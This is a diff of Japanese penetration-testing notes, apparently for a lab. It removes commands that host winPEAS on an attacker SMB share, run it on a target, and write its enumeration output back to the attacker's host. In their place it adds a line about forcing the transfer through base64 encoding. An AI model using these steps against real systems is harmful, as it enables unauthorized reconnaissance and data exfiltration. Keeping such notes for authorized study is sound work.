@@ -28,19 +28,7 @@ cp \\192.168.49.104\share\Seatbelt.exe .
 
 ### 転送・実行
 
-```zsh
-# Attacker
-mkdir share
-cp /usr/share/peass/winpeas/winPEASx64.exe share/
-impacket-smbserver -smb2support -username username -password pw share share
-```
-```powershell
-# Target
-cd ~
-net use \\192.168.49.104\share /user:username pw
-cp \\192.168.49.104\share\winPEASx64.exe .
-.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
-```
+listenrがうまくいかないので、base64 encodeして強制的に転送する
 
 ### 実行結果抽出
 
